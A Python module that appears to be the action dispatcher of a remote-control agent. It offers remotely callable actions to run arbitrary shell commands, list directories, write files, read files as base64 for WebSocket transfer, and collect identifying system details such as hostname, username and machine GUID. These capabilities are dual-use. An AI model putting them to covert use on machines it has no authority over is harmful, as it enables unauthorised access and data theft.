from __future__ import annotations

import base64
import os
import platform
from pathlib import Path

from platforms import get_platform

platform_mod = get_platform()

WS_FILE_DOWNLOAD_MAX_BYTES = 5 * 1024 * 1024


def execute_cmd(command: str, timeout: int = 30, shell: str = "auto") -> dict:
    return platform_mod.execute_cmd(command, timeout=timeout, shell=shell)


def list_dir(path: str | None = None) -> dict:
    if not path:
        path = get_desktop_path()

    target = Path(path)
    if not target.exists():
        return {"error": f"Не найдено: {path}"}
    if not target.is_dir():
        return {"error": f"Не директория: {path}"}

    dirs_list: list[dict] = []
    files_list: list[dict] = []
    try:
        for entry in os.scandir(target):
            try:
                stat = entry.stat()
                info = {
                    "name": entry.name,
                    "path": str(Path(entry.path)),
                    "size": stat.st_size if entry.is_file() else None,
                    "is_dir": entry.is_dir(),
                }
                if entry.is_dir():
                    dirs_list.append(info)
                else:
                    files_list.append(info)
            except OSError:
                pass
    except PermissionError:
        return {"error": f"Нет доступа: {path}"}

    dirs_list.sort(key=lambda item: item["name"].lower())
    files_list.sort(key=lambda item: item["name"].lower())
    return {
        "path": str(target),
        "dirs": dirs_list,
        "files": files_list,
        "dirs_count": len(dirs_list),
        "files_count": len(files_list),
    }


def write_content(path: str, content: str, append: bool = False, encoding: str = "utf-8") -> dict:
    try:
        file_path = Path(path)
        file_path.parent.mkdir(parents=True, exist_ok=True)
        mode = "a" if append else "w"
        with open(file_path, mode, encoding=encoding, newline="") as handle:
            handle.write(content)
        return {
            "path": str(file_path),
            "bytes_written": len(content.encode(encoding, errors="replace")),
            "mode": "append" if append else "overwrite",
            "total_size": file_path.stat().st_size,
        }
    except Exception as exc:
        return {"error": str(exc)}


def get_file_content(path: str, max_size: int = WS_FILE_DOWNLOAD_MAX_BYTES) -> dict:
    try:
        file_path = Path(path)
        if not file_path.exists():
            return {"error": f"Файл не найден: {path}"}
        if not file_path.is_file():
            return {"error": f"Не файл: {path}"}

        file_size = file_path.stat().st_size
        if file_size > max_size:
            return {
                "error": (
                    "FILE_TOO_LARGE: файл слишком большой для текущего канала передачи "
                    f"WebSocket ({file_size} байт, лимит {max_size} байт)."
                )
            }

        data = file_path.read_bytes()
        return {
            "filename": file_path.name,
            "size": len(data),
            "data_b64": base64.b64encode(data).decode("ascii"),
        }
    except Exception as exc:
        return {"error": str(exc)}


def get_desktop_path() -> str:
    return platform_mod.get_desktop_path()


def collect_system_info(device_id: str = "") -> dict:
    info = {
        "device_id": device_id,
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": platform.node(),
        "username": platform_mod.get_username(),
        "desktop_path": platform_mod.get_desktop_path(),
        "machine_guid": platform_mod.get_machine_guid(),
        "cpu": "",
        "gpu": "",
        "ram_gb": 0,
        "disks": [],
    }
    info.update(platform_mod.get_system_info())
    return info


ACTIONS = {
    "execute_cmd": lambda **params: execute_cmd(**params),
    "list_dir": lambda **params: list_dir(**params),
    "get_file_content": lambda **params: get_file_content(**params),
    "write_content": lambda **params: write_content(**params),
}

